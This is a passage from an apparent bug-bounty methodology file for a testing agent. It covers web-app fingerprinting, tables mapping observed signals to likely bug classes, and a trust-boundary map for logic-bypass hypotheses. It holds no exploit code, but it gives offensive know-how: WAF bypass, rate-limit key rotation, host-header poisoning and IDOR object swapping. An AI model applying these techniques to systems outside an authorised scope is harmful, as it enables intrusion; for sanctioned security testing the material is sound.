   *Why:* the client is where authorization state, prices, and hidden routes leak — this
   is the raw material for logic-bypass and client-trust findings.
4. **Server-side inventory.** App framework/session store (cookie names: `JSESSIONID`,
   `PHPSESSID`, `ASP.NET_SessionId`, `connect.sid`, `sessionid`+`csrftoken`, `_rails_session`,
   `XSRF-TOKEN`), DB via error signatures, cache layers (`Via`, `X-Cache`, `Age`, `X-Varnish`),
   API style (REST/GraphQL/gRPC-web/SOAP), rate-limit shape (`X-RateLimit-*`, `Retry-After`),
   proxy-header trust. *Why:* each of these maps directly to a sink class in the routing
   table (§6) — DB error shape routes to `sqli-testing`, session-cookie shape routes to
   `csrf-testing`, and so on.
5. **Version footprints — capture, then verify.** Banners (`Server: nginx/1.24`,
   `X-Powered-By: PHP/8.1.27`, framework error traces) are *leads*. Record them exactly,
   then confirm with a behavior probe or an in-scope template scan (nuclei/NVD) before
   anyone claims a CVE. *Why:* banners lie (hardened, proxied, stale, deliberately
   falsified); a CVE claim from a header alone dies in triage and pollutes the profile.
6. **Classify and route.** Match each observation to §6's table, load the named technique
   skill, and prioritize: (a) untested surface, (b) sink richness, (c) business value.
   *Why:* fingerprinting without routing is scrapbooking — the point is fewer, better probes.
7. **Edge-case validation before deep testing.** Cheap structural checks first: method
   quirks on harmless paths, path normalization (`--path-as-is`), trailing-slash/`;`/`//`
   behavior, case sensitivity, which endpoints 403 vs 404 when unauthenticated.
   *Why:* a router quirk discovered here is a bypass for three other skills later.
8. **Writeback.** Update `domains/<domain>/SKILL.md` → *Attack surface*: each fingerprint
   with its evidence and a `verified` / `guess` marker, plus "fingerprint-derived hypotheses
   not yet tested" ranked by value. End with a **Next session** list. *Why:* a wrong
   fingerprint entry misdirects the next session for an hour — markers are load-bearing.

## [Bugbountyskills.md] 3. Client-side fundamentals — signal → what it tells you → bugs it unlocks

| Signal you observed | Fundamentals it reveals | Bugs it points at |
|---|---|---|
| `window.__NEXT_DATA__` / `id="__next"` / `__next_f` flight data | Next.js SSR; props serialized into HTML | Props leakage (secrets passed to page props), `dangerouslySetInnerHTML`, AEM/cache quirks → `info-disclosure`, `xss` |
| `window.__NUXT__`, `/_nuxt/`, `v-html` compiled templates | Nuxt/Vue | Template/DOM sink injection → `xss` |
| `ng-version` attribute, Angular runtime | Angular; `$sanitize`/bypass history | Sanitizer bypass, template injection → `xss` |
| `__sveltekit_` hydration, SvelteKit | Svelte SSR islands | Hydration of attacker data → `xss` |
| jQuery `<3.5.0` in bundle, or `$(location.hash)`-style patterns | `htmlPrefilter` mXSS + hash auto-exec chains | DOM XSS chain → `xss` (V-03, mXSS variants) |
| `//# sourceMappingURL=` or `/static/js/*.map` (200) | Webpack/Vite build leaks original source | Internal paths, env key names, unshipped endpoints → `info-disclosure` → feeds `rce`/`sqli` leads |
| Chunk names / Vite `/@fs/` / import-map paths | Filesystem layout + build tool | Path disclosure → `path-traversal` hypotheses |
| `postMessage(..., '*')` + `message` listeners / `targetOrigin` never set | Cross-origin message trust | CSWSH, message-driven state change → `csrf`, `xss` |
| localStorage/sessionStorage/IndexedDB keys (`role`, `isAdmin`, `plan`, `features`, tokens) | Client-held authz/entitlement state | Client-trust bypass: flip locally, call API directly → `bac-idor` (V-06/V-11), `business-logic` |
| Cookie flags: no `HttpOnly` / `SameSite=None` / no `Secure` | Session hardening posture | XSS→session theft, CSRF surface → `csrf`, `xss` |
| CSP `report-only`, `unsafe-inline`/`unsafe-eval`, static nonce, no `object-src` | Which XSS defenses the team *meant* to run | Weak/absent defense = exploitability context; TT passthrough cases → `xss` (Trusted Types variants) |
| Service worker registration + cache API | Persistent script execution in origin | SW-based persistence/cache poisoning → `xss`, `business-logic` (cache deception) |
| Hidden inputs / `data-*` carrying price, qty, plan, flag, method | Business decisions rendered client-side | Tamper-then-replay → `business-logic` (V-01 money, V-04 mass assignment) |
| Feature flags, internal routes, admin paths enumerated in bundles | Undocumented API surface the UI gates only | Direct calls bypass UI gates → `bac-idor` (BFLA), `business-logic` |
| JSON-LD / meta / OG fields echoing user input | Reflected structured data | Reflected injection in rich previews → `xss`, `info-disclosure` |
| PDF.js / renderers / image pipelines (EXIF, ImageMagick signatures) | Server-side document/media processing | SSRF/RCE via media handlers → `ssrf`, `rce` |

## [Bugbountyskills.md] 4. Server-side fundamentals — signal → what it tells you → bugs it unlocks

| Signal you observed | Fundamentals it reveals | Bugs it points at |
|---|---|---|
| `Server:`/`X-Powered-By:` version banners, `X-AspNet-Version`, `X-Version` | Exact runtime versions (or a lie) | Version-shaped defects — verify via behavior/template first → `rce`, `info-disclosure` |
| `cf-ray`/`cf-cache-status`, `x-amz-cf-id`, `akamai`/`x-akamai-*`, `BIGipServer` cookie, `incap_ses`/`visid_incap`, `x-sucuri-*`, `x-amzn-waf` | Which edge/WAF terminates the request | WAF bypass ladder + direct-origin testing → `blocked-page-recovery` (§3), all injection skills |
| Cookie pair: `JSESSIONID` (Java/Tomcat), `PHPSESSID`, `ASP.NET_SessionId`, `connect.sid` (Express), `_rails_session`+`_csrf`, `sessionid`+`csrftoken` (Django), `XSRF-TOKEN` (Angular/Laravel) | App framework + session store + CSRF design | Framework-specific CSRF/token handling → `csrf`; framework error semantics → others |
| SQL error strings (`You have an error in your SQL syntax` / `PG::Error` / `ORA-` / `ODBC`/`mssql`), `MongoError`/`CastError` on JSON input | DBMS and query construction | Injection class + dialect → `sqli` (NoSQLi for Mongo) |
| Django `DEBUG` page / Werkzeug console / Flask debug / ASP.NET `web.config` trace / Rails `ActionDispatch` trace / Spring Whitelabel | Debug mode in production | Config+path disclosure, interactive console = RCE → `info-disclosure` → `rce` |
| `/actuator/*`, `/jolokia`, `/env`, `/server-status`, `/server-info`, `/php-fpm-status`, `/debug/pprof` | Ops/management surface exposed | Cred/config leak → `info-disclosure`; RCE chains → `rce` |
| `/swagger`, `/openapi.json`, `/graphql`, `/graphiql`, `/wp-json`, WSDL, gRPC-web descriptor | API style and full route inventory | Endpoint inventory feeds every skill; GraphQL depth → `bac-idor` (V-12), `sqli` |
| `Via`, `X-Cache`, `Age`, `X-Varnish`, `X-Cache: HIT` on personalized responses | Cache layer + keying behavior | Cache poisoning/deception, key-injection → `business-logic`, `csrf` |
| `X-RateLimit-Limit/Remaining/Reset`, `Retry-After`, 429 shape | Limiting key (IP? token? account?) | Rotate the key (header/proxy/session) → `business-logic` (rate-limit bypass), `bac-idor` |
| `X-Forwarded-For/Host/Proto` honored or reflected | Proxy-header trust | Host-header password-reset poisoning, IP-allowlist bypass → `business-logic` (R1-R7), `bac-idor` |
| `Alt-Svc`/`h2`/`h3`, `Transfer-Encoding` oddities | HTTP version/edge normalization split | Request-smuggling primitives → `csrf` (§ CSWSH/smuggling), header-injection skills |
| nginx `X-Accel-Redirect`, alias locations, IIS `~` shortname, Tomcat servlet mappings, PHP `PATH_INFO` | Static-layer routing quirks | Alias/traversal/servlet bugs → `path-traversal` → `rce` |
| Only version footprints you cannot place | Missing component knowledge | Consult §8 dataset when ingested; otherwise mark `unknown` — do not guess |

## [Bugbountyskills.md] 5. Trust-boundary map — where "logic bypass" hypotheses come from

Logic bugs are trust boundaries drawn in the wrong place. Use this map to decide *which*
boundary to attack:

- **Browser computes, server must re-check** → price, discount, quota, feature flags,
  step order. Attacker controls anything the JS computed. → `business-logic`.
- **UI enforces, API doesn't** → hidden buttons, disabled inputs, route guards, `role` in
  storage. Call the API directly. → `bac-idor` (BFLA / V-11).
- **Client names the object** → `id`, `uuid`, `user_id`, nested path segments, GraphQL
  global IDs. Swap the name, keep your session. → `bac-idor` (V-01/V-05/V-13).
- **Proxy is trusted** → `X-Forwarded-*` reach the app unrewritten; security decisions
  (host, IP allowlists, scheme) inherit attacker input. → `business-logic`, `bac-idor`.
- **Version skew** → `/v1` still enforces what `/v2` added. → `bac-idor` (V-10).
- **Stored now, used later** → webhook URLs, export targets, template fields saved by the
  client and fetched by the server. → `ssrf`, second-order `bac-idor` (V-09).
- **Serialization boundary** → cookie/JSON/YAML/protobuf that the server *deserializes*
  rather than parses. → `rce`, `sandbox-escape`.
- **Normalization boundary** → edge decodes/normalizes differently than the app (double
  encoding, `..;`, case, HPP). → `path-traversal`, `sqli`, `bac-idor` (V-07).

